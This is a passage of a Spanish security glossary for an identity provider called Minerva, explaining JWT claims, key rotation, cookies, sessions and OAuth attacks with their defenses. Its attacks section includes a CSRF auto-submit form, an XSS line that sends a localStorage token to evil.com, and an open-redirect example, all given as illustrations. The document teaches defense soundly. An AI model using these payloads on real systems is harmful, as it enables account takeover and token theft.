**Ejemplo.** La cookie de sesión del panel admin de Minerva es opaca: el navegador solo tiene
un identificador, y el JWT real vive en Redis del lado del servidor.

### TTL (Time To Live)

**Qué es.** Cuánto vive algo antes de expirar solo.

**Para qué sirve.** Es la palanca principal para acotar el daño de una credencial filtrada.

**Ejemplo.** Access token 15 min, refresh token 30 días, sesión de panel 480 min.

### Revocación

**Qué es.** Invalidar un token **antes** de que expire por su cuenta.

**Para qué sirve.** Sin ella, un token robado sigue funcionando hasta su `exp` y no hay nada
que hacer.

**Ejemplo.** Es el problema estructural de los JWT: al ser autocontenidos, se validan sin
consultar a nadie... incluido el que quiere revocarlos. La solución es una lista de revocación
consultada en cada validación (ver `jti`).

---

## 10. Claims

### Claim

**Qué es.** Cada campo dentro del payload del JWT. Literalmente "afirmación": el IdP *afirma*
que esto es cierto.

**Para qué sirve.** Es el contenido útil del token.

**Ejemplo.** `"email": "ana.perez@jalisco.gob.mx"` es el IdP afirmando cuál es el correo de
este usuario.

### Registered claims (claims estándar)

**Qué es.** Los claims definidos por el RFC 7519, con nombres cortos de tres letras.

**Para qué sirve.** Que cualquier librería del mundo los entienda sin configuración.

| Claim | Nombre | Qué contiene | Ejemplo |
|---|---|---|---|
| `iss` | *issuer* | Quién emitió el token | `https://minerva.jalisco.gob.mx` |
| `sub` | *subject* | El ID único del usuario | `a3f9c2d1-...` |
| `aud` | *audience* | Para quién es este token | `portal_demo` |
| `exp` | *expiration* | Cuándo vence (timestamp Unix) | `1730000000` |
| `iat` | *issued at* | Cuándo se emitió | `1729999100` |
| `nbf` | *not before* | No válido antes de | `1729999100` |
| `jti` | *JWT ID* | Identificador único del token | `f47ac10b-...` |

### `sub` (subject)

**Qué es.** El identificador **único e inmutable** del usuario.

**Para qué sirve.** Es la llave por la que los sistemas consumidores deben referenciar al
usuario.

**Ejemplo.** Un UUID como `a3f9c2d1-4b5e-...`.

> ⚠️ **Nunca uses el correo como identificador.** Los correos cambian (matrimonio, cambio de
> área, corrección de typo). El `sub` no cambia nunca. Si guardas el correo como llave foránea,
> el día que alguien cambie de correo pierdes el vínculo con todos sus registros.

### `aud` (audience)

**Qué es.** Para quién fue emitido el token.

**Para qué sirve.** Impide que un token emitido para un sistema sirva en otro.

**Ejemplo del ataque que previene.** Sin validar `aud`, un token emitido para una app de bajo
riesgo podría presentarse en una API crítica. Cada API **debe** verificar que el `aud` sea el
suyo.

### `exp` (expiration)

**Qué es.** El momento en que el token deja de ser válido, como timestamp Unix (segundos desde
1970, en UTC).

**Para qué sirve.** Es la caducidad automática, la protección que funciona incluso si nadie
está mirando.

**Ejemplo.** `1730000000`. Toda validación debe comprobarlo, con un pequeño margen por clock
skew.

### `iat` (issued at)

**Qué es.** Cuándo se emitió el token.

**Para qué sirve.** Permite invalidar **en bloque** todos los tokens de un usuario emitidos
antes de cierto momento.

**Ejemplo.** Ana cambia su contraseña a las 14:00. Minerva registra un corte: "todo token de
Ana con `iat` anterior a las 14:00 queda inválido". Con una sola marca invalida todas sus
sesiones, sin listar token por token.

### `jti` (JWT ID)

**Qué es.** Un identificador único de ese token específico.

**Para qué sirve.** Es lo que permite revocar **un** token concreto, poniéndolo en una lista
negra que se consulta en cada validación.

**Ejemplo.** Al cerrar sesión, Minerva guarda el `jti` en Redis hasta que el token expire por
su cuenta. Cualquier intento de usarlo se rechaza.

### `typ` (específico de Minerva)

**Qué es.** Un claim propio que marca la **clase** de token, mutuamente excluyente.

**Para qué sirve.** Evita que un token de un contexto se use en otro, aunque su firma sea
perfectamente válida.

**Ejemplo.**

| `typ` | Uso | `aud` | Vida |
|---|---|---|---|
| `session` | Sesión del panel admin | `minerva` | 480 min |
| `access` | Consumidor OIDC | código de la app | 15 min |
| `id` | ID Token | `client_id` | corta |
| `dev` | Dev Kit | — | — |

Cada endpoint acepta solo su clase. El panel exige `typ=session`; el SDK de un consumidor solo
acepta `typ=access`.

### `auth_time`

**Qué es.** Cuándo se autenticó realmente el usuario en **esta** sesión.

**Para qué sirve.** Es contra este valor que se evalúa `max_age`.

**Ejemplo.** Al refrescar un token, `auth_time` **no** se actualiza — sigue apuntando al login
original. Si se renovara, `max_age` nunca se cumpliría y la protección sería decorativa.

---

## 11. Firma y llaves

### JWKS (JSON Web Key Set) — RFC 7517

**Qué es.** Un documento JSON con las **llaves públicas** de firma del IdP, publicado en
`/.well-known/jwks.json`.

**Para qué sirve.** Que los consumidores verifiquen firmas **sin llamar al IdP en cada
request** y sin compartir ningún secreto.

**Ejemplo.**
```json
{ "keys": [
    { "kid": "a3f9c2", "kty": "RSA", "use": "sig", "alg": "RS256",
      "n": "0vx7agoebGc...", "e": "AQAB" }
]}
```

> **El JWKS no valida nada** — es un archivo estático de llaves. Solo responde "¿este token lo
> firmó realmente el IdP?". Si el token expiró o fue revocado son preguntas distintas, con
> mecanismos distintos.

### JWK (JSON Web Key)

**Qué es.** Una llave individual dentro del JWKS, en formato JSON.

**Para qué sirve.** Es un formato estándar que cualquier librería sabe leer, a diferencia de un
archivo PEM suelto.

**Ejemplo.** Para RSA: `n` es el módulo y `e` el exponente público. No necesitas entender la
matemática, solo saber que juntos son la llave pública.

### `kid` (Key ID)

**Qué es.** El identificador de la llave concreta que firmó un token. Va en el **header** del
JWT.

**Para qué sirve.** Permite que el JWKS publique **varias llaves a la vez** y que el
verificador sepa cuál usar. Es lo que hace posible rotar sin cortar el servicio.

**Ejemplo.** Llega un token con `"kid": "a3f9c2"` → el verificador busca esa llave en el JWKS →
verifica la firma con ella.

### Rotación de llaves de firma

**Qué es.** Reemplazar periódicamente la llave RSA activa por una nueva.

**Para qué sirve.** Higiene criptográfica: acota la ventana de exposición si una llave se
compromete.

**Ejemplo.** En Minerva es un proceso manual de dos fases:
`python -m app.cli rotate-key` y luego `python -m app.cli promote-key`.

### Publish-before-use (publicar antes de usar)

**Qué es.** La regla de publicar una llave nueva en el JWKS **antes** de empezar a firmar con
ella.

**Para qué sirve.** Evita un corte de servicio. Los consumidores **cachean** el JWKS; si el IdP
empieza a firmar con una llave que ellos no tienen todavía, rechazarán todos los tokens.

**Ejemplo.** El ciclo de vida de una llave en Minerva:

| Estado | Significa |
|---|---|
| `pending` | Ya publicada en el JWKS, **todavía no firma nada** |
| `active` | La única que firma tokens nuevos |
| `retired` | Sigue publicada hasta que expire el último token que firmó |

### Ventana de propagación

**Qué es.** El tiempo que debe pasar entre publicar una llave y empezar a usarla.

**Para qué sirve.** Darle a todos los cachés la oportunidad de refrescarse.

**Ejemplo.** `MINERVA_KEY_PROPAGATION_MINUTES`. Debe ser **mayor** que el TTL de caché del
consumidor más lento. Si el SDK cachea 1 hora, una ventana de 10 minutos no cumple su función.

### Ventana de solapamiento (overlap)

**Qué es.** Cuánto sigue publicada una llave ya retirada.

**Para qué sirve.** Que los tokens firmados con ella sigan verificándose hasta que expiren
solos.

**Ejemplo.** Debe ser al menos la vida máxima de un token, más margen por clock skew.

---

## 12. Sesiones

### Stateless (sin estado)

**Qué es.** El servidor **no guarda nada** sobre la sesión: toda la información va en el token
y se valida por firma.

**Para qué sirve.** Escala horizontalmente sin esfuerzo — cualquier instancia puede atender
cualquier request, sin sesiones pegajosas ni almacén compartido.

**Ejemplo.** Así funcionan los consumidores OIDC de Minerva. La contrapartida: no se puede
revocar sin agregar un mecanismo extra.

### Stateful (con estado)

**Qué es.** El servidor guarda el estado de la sesión; el cliente solo tiene una referencia.

**Para qué sirve.** Permite revocación instantánea y mantener el token fuera del navegador.

**Ejemplo.** Así funciona el panel admin de Minerva — la **única** excepción deliberada al
diseño stateless.

### BFF (Backend For Frontend)

**Qué es.** Un patrón donde el backend guarda los tokens **él mismo**, para que el navegador
nunca los vea.

**Para qué sirve.** Anula por completo el robo de tokens vía **XSS**: no hay token en el
navegador que robar.

**Ejemplo.** El panel de Minerva usa una cookie opaca; el JWT vive en Redis, del lado del
servidor.

### Cookie `HttpOnly`

**Qué es.** Una marca en la cookie que impide que JavaScript la lea.

**Para qué sirve.** Aunque un atacante logre ejecutar JavaScript en la página (XSS), no puede
leer la cookie.

**Ejemplo.** Es la razón por la que guardar un token en `localStorage` es peor que en una
cookie `HttpOnly`: `localStorage` **siempre** es legible por JavaScript.

### Prefijo `__Host-`

**Qué es.** Un prefijo en el nombre de la cookie que el navegador interpreta como reglas
obligatorias: solo HTTPS, sin `Domain`, y `Path=/`.

**Para qué sirve.** Impide que un subdominio comprometido escriba una cookie que afecte al
dominio principal.

**Ejemplo.** `__Host-minerva_sid`. En desarrollo (sin HTTPS) se usa `minerva_sid` a secas,
porque el navegador rechazaría el prefijo.

### `SameSite`

**Qué es.** Un atributo de cookie que controla si se envía en peticiones originadas por otro
sitio.

**Para qué sirve.** Es una de las defensas contra **CSRF**.

**Ejemplo.** `SameSite=Lax` — la cookie no se envía en peticiones cross-site salvo navegación
de primer nivel.

---

## 13. Ataques y defensas

Esta sección es la que explica *por qué* el protocolo tiene la forma que tiene. Casi cada
parámetro raro de OAuth existe por un ataque concreto.

### CSRF (Cross-Site Request Forgery)

**Qué es.** Un sitio malicioso provoca que **tu navegador** envíe una petición autenticada a
otro sitio, sin que lo sepas.

**Por qué funciona.** El navegador adjunta las cookies **automáticamente**, sin importar quién
originó la petición.

**Ejemplo.** Estás autenticado en Minerva. Visitas un sitio cualquiera que contiene:
```html
<form action="https://minerva.../users/me" method="POST" id="f">
  <input name="email" value="atacante@evil.com">
</form>
<script>f.submit()</script>
```
Tu navegador envía tu cookie y el cambio se aplica con tu identidad.

**Defensa.** Un token CSRF que el atacante no puede leer (patrón *synchronizer token*): el
servidor exige un header `X-CSRF-Token`, y la política de origen del navegador impide que un
sitio externo lo obtenga. Se combina con validación de `Origin` y `SameSite`.

### XSS (Cross-Site Scripting)

**Qué es.** Un atacante logra ejecutar **su** JavaScript en el contexto de tu sitio.

**Por qué importa aquí.** Ese JavaScript puede leer todo lo que el JavaScript legítimo lee —
incluido un token guardado en `localStorage`.

**Ejemplo.** Si guardas el access token en `localStorage`, un XSS lo roba en una línea:
`fetch('https://evil.com?t=' + localStorage.token)`.

**Defensa.** Cookie `HttpOnly` (invisible a JavaScript) + patrón BFF (el token ni siquiera está
en el navegador) + CSP.

### Open Redirect

**Qué es.** Aprovechar un parámetro de redirección sin validar para enviar al usuario —o a su
`code`— a un destino del atacante.

**Ejemplo.** `?redirect_uri=https://sitio-del-atacante.com`. La víctima se autentica de verdad,
pero el `code` termina en manos ajenas.

**Defensa.** Lista blanca de `redirect_uri` registradas, con **coincidencia exacta**. Nunca
por prefijo: `https://portal-demo.com.atacante.net` empieza con `https://portal-demo.com`.

### Replay attack (ataque de repetición)

**Qué es.** Capturar un mensaje válido y **reenviarlo** después para repetir su efecto.

**Ejemplo.** Un atacante guarda un `id_token` viejo y lo reinyecta en un flujo nuevo para
hacerse pasar por ese usuario.

**Defensa.** El `nonce` (un solo uso, verificado dentro del token) y el hecho de que el `code`
sea de un solo uso.

### Session Fixation (fijación de sesión)

**Qué es.** El atacante **impone** un identificador de sesión conocido por él a la víctima, y
espera a que ella se autentique con ese mismo identificador.

**Ejemplo.** Si el `sid` no cambiara al iniciar sesión, un atacante que logre fijarlo antes del
login tendría una sesión válida y autenticada después.

**Defensa.** **Rotar** el identificador de sesión en cada login, registro y refresh. El
identificador anterior deja de servir.

### Token leakage (filtración de tokens)

**Qué es.** El token termina donde no debe: historial, logs, `Referer`, capturas de pantalla.

**Ejemplo.** El implicit flow ponía el token en la URL. Todo lo que va en una URL se filtra por
media docena de caminos.

**Defensa.** Nunca poner tokens en URLs — por eso el `code` es intermedio, y por eso el token
real viaja por el back-channel.

### Man in the Middle (MITM)

**Qué es.** Alguien se interpone en la red y lee o altera el tráfico.

**Ejemplo.** Un WiFi público malicioso leyendo peticiones HTTP en claro.

**Defensa.** TLS en todo el trayecto. Sin TLS, ninguna otra protección de OAuth sirve de nada.

### Confused Deputy (diputado confundido)

**Qué es.** Un sistema con privilegios altos es engañado para usarlos en nombre de alguien que
no debería tenerlos.

**Ejemplo.** Una API acepta un token sin verificar el `aud`. Un token legítimo emitido para
otra aplicación le sirve a un atacante para entrar donde no debe.

**Defensa.** Validar **siempre** `aud` e `iss`, no solo la firma.

### Downgrade attack (ataque de degradación)

**Qué es.** Forzar al sistema a usar una variante más débil de un mecanismo.

**Ejemplo.** Pedir `code_challenge_method=plain` en vez de `S256`, anulando PKCE.

**Defensa.** Rechazar las variantes débiles en el servidor, sin excepciones. Minerva no acepta
`plain` ni HS256.

### Timing attack (ataque por tiempo)

**Qué es.** Deducir un secreto midiendo cuánto tarda una comparación en fallar.

**Ejemplo.** Un `==` normal sale en cuanto encuentra una diferencia; comparar `"aX"` tarda algo
más que `"bX"` si el secreto empieza con `a`. Repitiendo, se reconstruye el secreto.

**Defensa.** Comparación en tiempo constante para todo lo que sea secreto.

### Fuerza bruta / Rate limiting

**Qué es.** Probar credenciales masivamente hasta acertar. La defensa es limitar cuántos
intentos se aceptan por unidad de tiempo.

**Ejemplo.** Minerva limita el login en dos niveles: por **cuenta** (fallos por correo, el que
frena la fuerza bruta aunque el atacante rote IPs) y por **IP** real, con un umbral alto. La IP sale
de `X-Forwarded-For` solo si lo puso un proxy de confianza (`MINERVA_TRUSTED_PROXY` en nginx,
`FORWARDED_ALLOW_IPS` en el backend): si se confiara en el header tal como lo manda el cliente,
bastaría con cambiarlo en cada intento para esquivar el límite.

### Phishing

**Qué es.** Engañar al usuario para que escriba sus credenciales en un sitio falso.

**Por qué importa en el diseño.** Es la razón de fondo por la que la contraseña se escribe
**solo** en el IdP, nunca en el cliente: entrena al usuario a desconfiar de cualquier otro
formulario que se la pida.

**Defensa.** Un solo dominio de login, conocido y consistente. Y por eso el flujo `password`
está obsoleto.

---

## 14. Autorización fina en Minerva

Esto ya no es OAuth/OIDC estándar: es cómo Minerva resuelve la parte que los protocolos dejan
abierta.

### El principio rector

> **Los sistemas definen *qué* acciones existen. Minerva define *quién* puede hacerlas.
> Los sistemas validan permisos, nunca roles.**

### Permiso

**Qué es.** Una acción concreta que un sistema declara que existe, con la forma
`{application_code}.{resource}.{action}`.

**Para qué sirve.** Es la unidad **atómica y estable** de autorización, contra la que se
programa.

**Ejemplo.** `portal_demo.documents.create`. Acciones estándar: `view, create, update, delete, assign,
approve, authorize, export, import, manage`.

### Rol

**Qué es.** Un conjunto de permisos, definido por aplicación.

**Para qué sirve.** Es una comodidad **administrativa**: agrupar permisos para asignarlos
juntos desde el panel.

**Ejemplo.** El rol "Coordinador" agrupa `portal_demo.documents.view`, `.create` y `.approve`.

> 🔴 **El rol NUNCA se valida en código.** Un rol es una etiqueta que puede cambiar de
> contenido sin previo aviso: si mañana "Coordinador" pierde el permiso de aprobar, un
> `if user.role == "Coordinador"` sigue dejando pasar. El permiso es el contrato estable.

### Grupo

**Qué es.** Un conjunto de usuarios al que se le pueden asignar roles.

**Para qué sirve.** Administrar por área o equipo en vez de persona por persona.

**Ejemplo.** El grupo "Dirección de Estadística" tiene el rol "Coordinador"; todos sus miembros
heredan esos permisos, combinados con los que tengan directamente.

### Manifiesto (`manifest.minerva.yml`)

**Qué es.** Un archivo YAML donde un sistema consumidor declara su aplicación, sus permisos y
sus roles sugeridos.

**Para qué sirve.** Que los permisos de un sistema vivan **versionados junto a su código**, y
no se configuren a mano en una UI.

**Ejemplo.** Minerva lo auto-importa al arrancar y hace *upsert*: no duplica ni borra lo
existente.

### `require_permission` (SDK)

**Qué es.** La dependencia de FastAPI que valida un permiso concreto.

**Para qué sirve.** Es la forma correcta —y la única soportada— de proteger un endpoint.

**Ejemplo.**
```python
@router.post("/documents", dependencies=[Depends(require_permission("portal_demo.documents.create"))])
def crear_oficio(...):
    ...
```

### `get_current_user` (SDK)

**Qué es.** La dependencia que valida el token y devuelve el usuario autenticado.

**Para qué sirve.** Hace toda la validación correcta: firma contra el JWKS, `exp`, `aud`, `typ`
y revocación.

**Ejemplo.** Úsala en vez de escribir tu propio `jwt.decode()`. Una implementación casera casi
siempre olvida validar `aud`, `typ` o la revocación.

---

## 15. Errores frecuentes

Los que más aparecen en revisión de código. Si solo te llevas una sección, que sea esta.

### 1. Validar roles en vez de permisos

```python
if user.role == "Admin":                       # ❌ frágil
require_permission("portal_demo.documents.create")     # ✅ estable
```

### 2. Escribir tu propia validación de JWT

```python
payload = jwt.decode(token, key, algorithms=["RS256"])   # ❌ incompleto
```
Falta `aud`, falta `typ`, falta revocación, falta el manejo de `kid`. El SDK ya hace todo eso.

### 3. Usar el `id_token` para llamar APIs

El `id_token` dice *quién eres*, para el cliente. El `access_token` es el que autoriza
llamadas. No son intercambiables.

### 4. Guardar tokens en `localStorage`

Cualquier XSS los roba. Usa cookie `HttpOnly`, o mejor el patrón BFF.

### 5. Usar el correo como identificador de usuario

Los correos cambian; el `sub` no. Si tus llaves foráneas apuntan al correo, un cambio de
correo te desvincula todos los registros de esa persona.

### 6. Poner datos sensibles en el JWT

Un JWT es **legible por cualquiera**. Base64 no es cifrado.

### 7. Confundir `scope` con permisos

`scope` es de identidad (`openid`, `profile`, `email`). Los permisos de negocio
(`portal_demo.documents.create`) se resuelven aparte.

### 8. Validar `redirect_uri` por prefijo

`https://portal-demo.com.atacante.net` empieza con `https://portal-demo.com`. Coincidencia **exacta**,
siempre.

### 9. Access tokens de vida larga

"Es que refrescar es molesto" — es exactamente para eso que existe el refresh token.

### 10. Confundir autenticación con autorización

Un usuario perfectamente autenticado puede no estar autorizado para nada. Son dos preguntas
distintas y se responden en momentos distintos.

---

## Referencias

- **RFC 6749** — OAuth 2.0 Authorization Framework
- **RFC 6750** — Bearer Token Usage
- **RFC 7009** — Token Revocation
- **RFC 7517** — JSON Web Key (JWK / JWKS)
- **RFC 7519** — JSON Web Token (JWT)
- **RFC 7636** — PKCE
- **RFC 8615** — Well-Known URIs
- **OpenID Connect Core 1.0** — https://openid.net/specs/openid-connect-core-1_0.html
- **OAuth 2.0 Security Best Current Practice** — el documento que explica por qué implicit y
  password quedaron obsoletos

Documentos relacionados en este repositorio: [`arquitectura.md`](arquitectura.md),
[`integracion.md`](integracion.md), [`despliegue.md`](despliegue.md).
